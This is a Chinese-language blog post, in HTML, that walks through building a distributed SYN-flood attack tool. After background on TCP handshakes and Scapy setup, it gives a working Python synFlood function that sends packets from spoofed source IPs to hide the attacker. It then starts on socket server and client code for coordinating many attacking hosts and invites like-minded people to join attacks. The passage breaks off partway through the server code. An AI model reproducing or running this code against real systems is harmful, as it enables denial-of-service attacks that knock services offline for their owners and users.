<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="DDoS Attacker v0.1仓库链接To~GitHub 仓库结构 ddos_client_v0.1.py —— DDoS客户端 ddos_server_v0.1.py —— DDoS服务端 test&#x2F; —— 存放单独模块的测试脚本 drafts&#x2F; ——  存放实现过程中的“草稿” refer&#x2F; —— 存放原作者参考的代码  攻击原理首先实现SYN泛洪攻击（SYN Flood，是一直常用的D">
<meta property="og:type" content="article">
<meta property="og:title" content="DDoS_Attacker_0.1">
<meta property="og:url" content="https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/index.html">
<meta property="og:site_name" content="喵了个咪乎 Cat My Dog">
<meta property="og:description" content="DDoS Attacker v0.1仓库链接To~GitHub 仓库结构 ddos_client_v0.1.py —— DDoS客户端 ddos_server_v0.1.py —— DDoS服务端 test&#x2F; —— 存放单独模块的测试脚本 drafts&#x2F; ——  存放实现过程中的“草稿” refer&#x2F; —— 存放原作者参考的代码  攻击原理首先实现SYN泛洪攻击（SYN Flood，是一直常用的D">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://119.3.78.82:8085/uploads/big/84273932ac52825c1e6dd54a1155273e.png">
<meta property="og:image" content="http://119.3.78.82:8085/uploads/big/611cbd062a697a303a79e36adfecc21d.png">
<meta property="og:image" content="http://119.3.78.82:8085/uploads/big/9e0734662000d35db1c5e9bf19175183.gif">
<meta property="og:image" content="http://119.3.78.82:8085/uploads/big/a375724463afb7b4eae2b0550a05764f.png">
<meta property="og:image" content="http://119.3.78.82:8085/uploads/big/6961dee0c77ba3b193f26447e4b7932f.png">
<meta property="og:image" content="http://119.3.78.82:8085/uploads/big/b41516447d764d6b43914b984a656792.png">
<meta property="article:published_time" content="2019-10-25T01:03:03.000Z">
<meta property="article:modified_time" content="2019-10-27T17:53:13.000Z">
<meta property="article:author" content="Toky">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://119.3.78.82:8085/uploads/big/84273932ac52825c1e6dd54a1155273e.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>DDoS_Attacker_0.1</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="喵了个咪乎 Cat My Dog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/Project">Projects</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
         
          <li><a href="/books">Books</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/10/25/articles/2019/10/25/1572002541500.html/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/10/23/Re-Writing/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&text=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&is_video=false&description=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DDoS_Attacker_0.1&body=Check out this article: https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&title=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&name=DDoS_Attacker_0.1&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y1ng.org/2019/10/25/DDoS-Attacker-0-1/&t=DDoS_Attacker_0.1" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDoS-Attacker-v0-1"><span class="toc-number">1.</span> <span class="toc-text">DDoS Attacker v0.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#仓库链接"><span class="toc-number">1.1.</span> <span class="toc-text">仓库链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#仓库结构"><span class="toc-number">1.2.</span> <span class="toc-text">仓库结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击原理"><span class="toc-number">1.3.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充：TCP三次握手以及TCP-IP族相关"><span class="toc-number">1.4.</span> <span class="toc-text">补充：TCP三次握手以及TCP&#x2F;IP族相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-IP协议族"><span class="toc-number">1.4.1.</span> <span class="toc-text">TCP&#x2F;IP协议族</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三次“建立”四次“分手”"><span class="toc-number">1.4.2.</span> <span class="toc-text">三次“建立”四次“分手”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具介绍"><span class="toc-number">1.5.</span> <span class="toc-text">工具介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips-踩坑小提示："><span class="toc-number">1.5.1.</span> <span class="toc-text">Tips 踩坑小提示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展：最小权限原则与sudo的使用"><span class="toc-number">1.5.2.</span> <span class="toc-text">扩展：最小权限原则与sudo的使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDoS实现思路"><span class="toc-number">1.6.</span> <span class="toc-text">DDoS实现思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前期准备"><span class="toc-number">1.7.</span> <span class="toc-text">前期准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实现一次SYN泛洪攻击"><span class="toc-number">1.7.1.</span> <span class="toc-text">实现一次SYN泛洪攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用argparse命令行解析模块"><span class="toc-number">1.7.2.</span> <span class="toc-text">使用argparse命令行解析模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用socket模块"><span class="toc-number">1.7.3.</span> <span class="toc-text">使用socket模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体实现"><span class="toc-number">1.8.</span> <span class="toc-text">具体实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端实现"><span class="toc-number">1.8.1.</span> <span class="toc-text">服务端实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端实现"><span class="toc-number">1.8.2.</span> <span class="toc-text">客户端实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试使用"><span class="toc-number">1.9.</span> <span class="toc-text">测试使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.10.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        DDoS_Attacker_0.1
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">喵了个咪乎 Cat My Dog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-10-25T01:03:03.000Z" itemprop="datePublished">2019-10-25</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Security/" rel="tag">Security</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="DDoS-Attacker-v0-1"><a href="#DDoS-Attacker-v0-1" class="headerlink" title="DDoS Attacker v0.1"></a>DDoS Attacker v0.1</h1><h2 id="仓库链接"><a href="#仓库链接" class="headerlink" title="仓库链接"></a>仓库链接</h2><p><a href="https://github.com/satan1a/DDoS_Attacket_v0.1" target="_blank" rel="noopener">To<del>~</del>GitHub</a></p>
<h2 id="仓库结构"><a href="#仓库结构" class="headerlink" title="仓库结构"></a>仓库结构</h2><ul>
<li>ddos_client_v0.1.py —— DDoS客户端</li>
<li>ddos_server_v0.1.py —— DDoS服务端</li>
<li>test/ —— 存放单独模块的测试脚本</li>
<li>drafts/ ——  存放实现过程中的“草稿”</li>
<li>refer/ —— 存放原作者参考的代码</li>
</ul>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>首先实现SYN泛洪攻击（SYN Flood，是一直常用的DOS方式之一，通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽的攻击方式）。TCP三次握手的过程在下面补充。SYN攻击则是<strong>客户端向服务器发送SYN报文之后就不再响应服务器回应的报文，由于服务器在处理TCP请求时，会在协议栈留一块缓冲区来存储握手的过程，如果超过一定的时间没有接收到客户端的报文，那么本次连接在协议栈中存储的数据就会被丢弃。</strong> 攻击者如果利用这段时间发送了大量的连接请求，全部挂起在半连接状态，这样将不断消耗服务器资源，直到拒接服务。<br><img src="http://119.3.78.82:8085/uploads/big/84273932ac52825c1e6dd54a1155273e.png" alt="SYN报文请求过程"><br>上图，就是SYN报文请求过程。SYN是TCP包的一个类型，表示建立连接。ACK表示响应。</p>
<h2 id="补充：TCP三次握手以及TCP-IP族相关"><a href="#补充：TCP三次握手以及TCP-IP族相关" class="headerlink" title="补充：TCP三次握手以及TCP/IP族相关"></a>补充：TCP三次握手以及TCP/IP族相关</h2><h3 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h3><p>TCP/IP是一个协议族。因为TCP/IP协议包括TCP、IP、UDP、ICMP、RIP、TELNETFTP、SMTP、ARP、TFTP等许多协议，这些协议一起称为TCP/IP协议。<br>其中TCP全称为Transport Control Protocol, 传输控制协议。位于OSI参考模型的第4层，传输层。下图为TCP/IP对应OSI中的层以及功能介绍：<br><img src="http://119.3.78.82:8085/uploads/big/611cbd062a697a303a79e36adfecc21d.png" alt="TCP/IP对应OSI中的层以及功能"></p>
<h3 id="三次“建立”四次“分手”"><a href="#三次“建立”四次“分手”" class="headerlink" title="三次“建立”四次“分手”"></a>三次“建立”四次“分手”</h3><p>接下来，我们讲回TCP协议，TCP需要三次握手才能建立，断开断开连接需要四次握手，过程如下：<br><img src="http://119.3.78.82:8085/uploads/big/9e0734662000d35db1c5e9bf19175183.gif" alt="TCP三次连接四次分手"></p>
<p>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接，以下详细的文字描述：</p>
<p> 位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p>
<p>第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；</p>
<p> 第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包；</p>
<p> 第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。</p>
<p> 完成三次握手，主机A与主机B开始传送数据。</p>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Scapy是一个交互式数据包处理程序，可以用来发送、嗅探、解析和伪造网络数据包。本文环境为Ubuntu18.04LTS Desktop, VBox。可以使用apt或者pip安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># pip安装推荐推荐虚拟环境安装，安全也要讲究低耦合</span><br><span class="line">pip3 install scapy</span><br><span class="line"># 或者</span><br><span class="line">sudo apt-get install python-scapy</span><br><span class="line"># 运行scapy需要sudo权限</span><br><span class="line">sudo scapy</span><br><span class="line"># 运行会出现一些警告信息，先不用管</span><br></pre></td></tr></table></figure>

<h3 id="Tips-踩坑小提示："><a href="#Tips-踩坑小提示：" class="headerlink" title="Tips 踩坑小提示："></a>Tips 踩坑小提示：</h3><p>使用<code>sudo pip</code>安装，会安装到系统全局环境。如果我们激活虚拟环境后，再sudo pip，同样也会安装到系统全局环境，所以不要做按耳盗铃的事情哦~<br>但有时候，比如scapy，需要sudo权限执行，但<code>pip install scapy</code>安装后使用<code>sudo scapy</code>会显示command not found。但我们又不想把它安装到全局环境，那么解决办法是？</p>
<p>答案：sudo + 虚拟环境下的 bin/scapy。 e.g. <code>sudo ./venv/bin/scapy</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ ls</span><br><span class="line">activate      activate.fish  activate_this.py  easy_install      pip   pip3.6  python3    python-config  UTscapy</span><br><span class="line">activate.csh  activate.ps1   activate.xsh      easy_install-3.6  pip3  python  python3.6  scapy          wheel</span><br><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo scapy</span><br><span class="line">sudo: scapy: command not found</span><br><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo .&#x2F;scapy</span><br></pre></td></tr></table></figure>
<p>构造一个SYN包，发送测试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个SYN包</span><br><span class="line">&gt;&gt;&gt; pkt &#x3D; IP(src &#x3D; &quot;125.4.2.1&quot;,dst&#x3D;&quot;192.168.50.10&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;)</span><br><span class="line">&gt;&gt;&gt; send(pkt)</span><br></pre></td></tr></table></figure>
<p>发送测试，成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo .&#x2F;scapy </span><br><span class="line">INFO: Can&#39;t import matplotlib. Won&#39;t be able to plot.</span><br><span class="line">INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().</span><br><span class="line">WARNING: No route found for IPv6 destination :: (no default route?)</span><br><span class="line">INFO: Can&#39;t import python-cryptography v1.7+. Disabled WEP decryption&#x2F;encryption. (Dot11)</span><br><span class="line">INFO: Can&#39;t import python-cryptography v1.7+. Disabled IPsec encryption&#x2F;authentication.</span><br><span class="line">WARNING: IPython not available. Using standard Python shell instead.</span><br><span class="line">AutoCompletion, History are disabled.</span><br><span class="line">&gt;&gt;&gt; pkt &#x3D; IP(src &#x3D; &quot;125.4.2.1&quot;,dst&#x3D;&quot;192.168.50.10&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;)</span><br><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>但真的正确吗？<br>表面上看是成功了，但是这种方式就违背一条信息安全里很重要的原则：<strong>最小权限原则</strong>，即系统中所有的程序和特权用户应当仅获得完成相应工作所需的最少的权限。<br>使用上述的这种方式，我们使用sudo暂时向系统借了权限，执行虚拟环境里的程序，那么一个本来就要求更高权限的程序<strong>才能正常工作</strong>的程序，为什么要隔离在相对没有权限的环境里，然后又人为帮助它去翻过虚拟环境的高墙去做更高权限的事情呢？</p>
<h3 id="扩展：最小权限原则与sudo的使用"><a href="#扩展：最小权限原则与sudo的使用" class="headerlink" title="扩展：最小权限原则与sudo的使用"></a>扩展：最小权限原则与sudo的使用</h3><p>扩展：我们知道，sudo存在的一大目的，就是为了安全，尽可能地防止误操作和权限滥用。但同时我们也应该明白，什么时候需要给他较低权限，什么时候要给它较高权限，以及什么时候可以用sudo来暂时提高权限。<br>e.g. 在Ubuntu中，不是每个用户都可以使用sudo, 因为操作nginx等这种需要很高权限的服务时，只有指定的，<strong>被授予权限来暂时提高权限的用户</strong>才可以使用sudo来对nginx操作，这就是遵循了最小权限原则————权限最小，但能正常工作。<br>那么我们在虚拟环境下使用<code>pip install scapy</code>就违背了后者，不能正常工作。在这种情况下，root进不去虚拟环境，虚拟环境理论上又不能用sudo“越权”。所以，我们判断是否需要sudo安装的判断条件就是三个：  </p>
<ol>
<li>用户的权限最小化</li>
<li>程序能正常工作</li>
<li>如果同时满足的情况需要sudo，就可以直接使用sudo安装。</li>
</ol>
<h2 id="DDoS实现思路"><a href="#DDoS实现思路" class="headerlink" title="DDoS实现思路"></a>DDoS实现思路</h2><p>DDoS全称是Distributed Denial of Service，翻译成中文就是分布式拒绝服务，简单地说，就是调动多台主机一起发起攻击。<br>如何协同多台主机一起发起攻击呢？一种传统的方法就是控制多台傀儡机，同时进行SYN泛洪攻击，还有一种模式叫做HIVEMIND。  </p>
<blockquote>
<p>通过HIVEMIND模式，用户可以通过连接到一台 IRC(Internet Relay Chat services)服务器，当有用户发送命令，任何以HIVEMIND模式连接到IRC服务器的成员都会立即攻击该目标。  </p>
</blockquote>
<p>简单地说，一台主机可以作为Socket Server，其他主机作为Client，Client使用socket方式连接到Server，接收到信息后发起攻击。理想情况，就是志同道合的同志，可以随时加入攻击过程，只需执行客户端连接脚本即可开始攻击。</p>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="实现一次SYN泛洪攻击"><a href="#实现一次SYN泛洪攻击" class="headerlink" title="实现一次SYN泛洪攻击"></a>实现一次SYN泛洪攻击</h3><p>具体步骤及介绍查看代码内注释，##注释内容为测试的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synFlood</span><span class="params">(tgt, dport)</span>:</span></span><br><span class="line">    <span class="comment"># 伪造的源IP地址列表，同时也是保护攻击者的一种方式</span></span><br><span class="line">    srcList = [<span class="string">'201.1.1.2'</span>,<span class="string">'10.1.1.102'</span>,<span class="string">'69.1.1.2'</span>,<span class="string">'125.130.5.199'</span>]</span><br><span class="line">    <span class="comment"># 从不同的源端口发送</span></span><br><span class="line">    <span class="keyword">for</span> sPort <span class="keyword">in</span> range(<span class="number">1024</span>, <span class="number">65535</span>):</span><br><span class="line">        <span class="comment"># 随机选择主机地址</span></span><br><span class="line">        index = random.randrange(<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># 一个完整的TCP包由一个IP包和TCO包组成</span></span><br><span class="line">        <span class="comment"># 1. 构造IP包，设置源地址src和目的地址dst</span></span><br><span class="line">        ipLayer = IP(src=srcList[index], dst=tgt)</span><br><span class="line">        <span class="comment">## print("IP layer is " + str(ipLayer))</span></span><br><span class="line">        <span class="comment"># 2. 构造TCP包，设置发送源端口sport和目的源端口dport,flag值设为S表示发送SYN数据包</span></span><br><span class="line">        tcpLayer = TCP(sport=sPort, dport = dport, flags=<span class="string">"S"</span>)</span><br><span class="line">        <span class="comment">## print("TCP layer is " + str(tcpLayer))</span></span><br><span class="line">        <span class="comment"># 3. 构造完整TCP包，IP包/TCP包</span></span><br><span class="line">        packet = ipLayer / tcpLayer</span><br><span class="line">        send(packet)</span><br><span class="line">        print(<span class="string">"Sent"</span>)</span><br><span class="line">        <span class="comment">## print(sPort)</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    synFlood(<span class="string">"192.168.50.10"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>


<h3 id="使用argparse命令行解析模块"><a href="#使用argparse命令行解析模块" class="headerlink" title="使用argparse命令行解析模块"></a>使用argparse命令行解析模块</h3><p>首先，我们需要命令行解析模块，对我们的命令行输入作处理。Scapy原本是一个命令行的模式，但我们不像每次攻击都手动输入一大堆命令吧，使用脚本会更加方便，所以我们需要argparse模块，对我们的命令行输入做处理，然后“发送”到Scapy中。</p>
<p>由于我们需要的是一对多模式（Server -&gt; Client），首先我们规定好命令行格式：  </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来进行使用argparse的训练：<br>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入argparse模块</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="comment"># 新建一个ArgumentParser对象，description是对命令行解析的一个描述信息，通常在使用-h命令时显示</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">"Process some integers."</span>)</span><br><span class="line"><span class="comment"># 增加一个参数</span></span><br><span class="line">parser.add_argument(<span class="string">'-p'</span>, dest=<span class="string">'port'</span>, type = int, help = <span class="string">'An port number!'</span>)</span><br><span class="line"><span class="comment"># 解析命令行输入</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(<span class="string">"Port: "</span>, args.port)</span><br></pre></td></tr></table></figure>

<p>实现效果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python argparse_test.py -h</span><br><span class="line">usage: argparse_test.py [-h] [-p PORT]</span><br><span class="line"></span><br><span class="line">Process some integers.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -p PORT     An port number!</span><br><span class="line"></span><br><span class="line">$ sudo python argparse_test.py -p 123</span><br><span class="line">Port:  123</span><br></pre></td></tr></table></figure>

<h3 id="使用socket模块"><a href="#使用socket模块" class="headerlink" title="使用socket模块"></a>使用socket模块</h3><p>使用socket实现网络信息交换，从而实现服务器与客户端的信息通信。<br>使用socket需要指定IP地址、端口号、协议类型。<br>以下为客户端的实现代码： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 创建socket对象，AF_INET表示使用IPV4对象，SOCK_STREAM表示使用的是基于流</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">'192.168.43.61'</span>, <span class="number">7786</span>))</span><br></pre></td></tr></table></figure>

<p>服务端代码：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器地址列表</span></span><br><span class="line">cliList = []</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定IP和端口，0.0.0.0表示绑定到所有的网络地址，但端口需要不被占用</span></span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">7786</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启监听器，设置最大连接数10</span></span><br><span class="line">s.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环等待新的连接，且将已连接的对象添加到列表中</span></span><br><span 